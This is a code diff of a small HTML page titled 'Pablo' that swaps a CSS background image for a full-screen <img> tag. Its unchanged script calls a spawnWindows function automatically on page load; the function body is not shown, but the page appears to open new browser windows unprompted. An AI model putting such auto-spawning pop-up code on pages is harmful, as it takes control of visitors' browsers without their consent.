@@ -4,19 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pablo</title>
-    <style>
-        /* Make the image cover the entire screen */
-        body {
-            background-image: url("https://raw.githubusercontent.com/monosourcil3000/mYpC/main/Pablo/Pablo.png");
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            margin: 0;
-            height: 100vh;
-            width: 100vw;
-            overflow: hidden; /* Prevents scrolling */
-        }
-    </style>
+   
     <script>
         function spawnWindows(count) {
             for (let i = 0; i < count; i++) {
@@ -46,5 +34,8 @@
         window.onload = () => setTimeout(() => spawnWindows(1), 500);
     </script>
 </head>
-<body></body>
+<body>
+    <img src="https://raw.githubusercontent.com/monosourcil3000/mYpC/main/Pablo/Pablo.png" alt="Pablo" style="width: 100vw; height: 100vh; object-fit: cover;">
+
+</body>
 </html>
